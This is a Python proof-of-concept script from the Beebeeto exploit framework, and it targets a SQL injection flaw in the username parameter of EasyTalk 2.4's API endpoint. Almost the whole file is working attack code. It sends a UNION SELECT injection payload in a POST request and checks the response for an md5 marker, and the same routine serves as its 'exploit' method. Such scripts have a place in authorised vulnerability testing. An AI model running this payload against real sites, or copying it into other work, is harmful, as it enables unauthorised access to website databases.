#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0051',
            'name': 'EasyTalk 2.4 /Home/Lib/Action/ApiAction.class.php SQL注入漏洞 POC',
            'author': '小马甲',
            'create_date': '2014-10-05',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'EasyTalk',
            'vul_version': ['2.4'],
            'type': 'SQL Injection',
            'tag': ['SQL注入漏洞', 'SQL Injection', 'EasyTalk漏洞'],
            'desc': 'EasyTalk 2.4 /Home/Lib/Action/ApiAction.class.php 文件参数username变量未合适过滤，导致SQL注入漏洞。',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-050344',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + r'/?m=api&a=userpreview'
        post_content = r'''username=sqlinjectiontest' UNION SELECT NULL,NULL,NULL,NULL,'''\
                        '''NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'''\
                        '''NULL,NULL,NULL,NULL,md5('sqlinjectiontest'),NULL,NULL,NULL,'''\
                        '''NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'''
        request = urllib2.Request(verify_url, post_content)
        response = urllib2.urlopen(request)
        content = response.read()
        if args['options']['verbose']:
            print '[*] Requst URL: ' + verify_url
            print '[*] POST content: ' + post_content
        if '526ae11a7ea509bd8338660e908ce9e0' in content:
            args['success'] = True
            args['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
